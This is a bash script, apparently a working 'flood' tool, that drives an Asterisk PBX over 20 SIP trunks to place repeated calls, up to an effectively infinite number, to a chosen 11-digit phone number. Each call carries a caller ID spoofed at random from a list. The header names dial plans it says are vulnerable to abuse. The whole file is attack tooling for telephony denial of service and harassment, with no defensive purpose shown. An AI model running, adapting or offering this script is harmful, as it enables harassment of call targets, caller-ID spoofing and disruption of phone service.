#!/bin/bash
## FINAL FLOOD VARIANT ## ABUSES North American Numbering Plan (US) # VULNERABLE DIAL PLANS: Samoa, Guam, Virgin Islands, Northern Mariana Islands, Puerto Rico (DOES NOT CONTIAN LIST FLOOD METHOD)
## CONFIG
# MAIN CONFIG
ext="420"
log_file="/var/log/flood_log.log"
# CID LIST DIRECTORY
cid_list_dir="/root/cids/"
# ARGUMENT CONTROL
tnum=$1; calls=$2; cid_list_file=$3
cid_list=$cid_list_dir$cid_list_file
## END OF CONFIG
## START OF SCRIPT
## KILL FUNCTION
if [[ $1 == "kill" || $1 == "k" || $1 == "-k" || $1 == "--kill" ]]; then # kills all screened floods
    if [[ -z $2 ]]; then
    pkill -9 -f "flood_atk"; asterisk -rx "channel request hangup all"
    screen -wipe &> /dev/null
    echo "All Hanging Calls Terminated!"
    rm /tmp/callfile* &> /dev/null
    exit 0
else # kills individual flood
    pkill -9 -f "$2"
    screen -wipe &> /dev/null
    echo "All Hanging Calls Terminated!"
    rm /tmp/callfile* &> /dev/null
    exit 0
fi; fi
## CHECKING USER INPUT
if ! [[ $tnum =~ ^[0-9]+$ || $calls =~ ^[0-9]+$ ]]; then # user input must only contain numbers
	echo "you fucked up... ($1) (TARGET NUMBER & CALL AMOUNT MUST ONLY CONTAIN NUMBERS!)"
	exit 0
elif [[ $1 -lt "10000000000" || -z $1 ]]; then # target number must be a valid 11 digit phone number
	echo "you fucked up... ($1) (TARGET NUMBER MUST BE 11 DIGITS!)"
	exit 0
elif [[ $2 -lt "0" || -z $2 ]]; then # target number must be a valid 11 digit phone number
    echo "you fucked up... ($1) (CALL AMOUNT MUST ONLY CONTAIN NUMBERS AND BE LARGER THAN -1 (0 being infinite!))"
    exit 0
fi
### LIST OF CiDS
if [[ -z $3 ]]; then
    echo "Select CiD List:"
    ls $cid_list_dir
    read -r cid_list_file
    cid_list=$cid_list_dir$cid_list_file ## re-configs cid_lists
fi
###
if [[ ! -f $cid_list ]]; then # target number must be a valid 11 digit phone number
	echo "you fucked up... ($1) (CiD LIST DOESNT EXIST!)"
	exit 0
fi
# INFINITE CALL VARIABLE
if [[ $calls == "0" ]]; then # if calls = 0 then calls will = maximum integer avaliable (basically infinite call flood!)
	MAX_INT=0
for ((x=1,y=1; x<<=y; y<<=1))
do
    if ((x>0)); then
        MAX_INT=$x
        continue
    fi; if (((x=~x)>0)); then
        MAX_INT=$x
    fi; break
done
    calls="$MAX_INT" # $MAX_INT = current maximum integer
fi
#
echo "Flood Started on $1 with $3 list, for $2 Seconds!" | tee -a $log_file 
## START CALL COUNTER
for (( c=1; c<=calls; c++))
do
COUNT=$[$COUNT +1] # (call counting function)
## START OF FLOOD
## START OF METHOD SHIT
cid=$(shuf -n 1 "$cid_list")
## END OF METHOD SHIT
# call file
trunknum=$(shuf -i 1-20 -n1) # selects random trunk from 1-20 (20 hardcoded trunks in asterisk)
trunk="T$trunknum-1" # must be formatted to work with asterisk hardcoded trunks!
echo "Channel: PJSIP/$tnum@$trunk" | tee /tmp/callfile.call > /dev/null
echo "CallerID: $cid" | tee -a /tmp/callfile.call > /dev/null
echo "WaitTime: 1" | tee -a /tmp/callfile.call > /dev/null # testing (to be set to 1)
echo "Extension: $ext" | tee -a /tmp/callfile.call > /dev/null
chmod 777 /tmp/callfile.call # setting perms for call file
chown asterisk:asterisk /tmp/callfile.call # setting perms for call file
mv /tmp/callfile.call /var/spool/asterisk/outgoing/ # moves call file to outgoing spool (this will start the call process)
rm /tmp/callfile.call &> /dev/null # removes file than ends (most likely repeats unless count is done)
## END OF FLOOD
# END CALL COUNTER
done
## END OF SCRIPT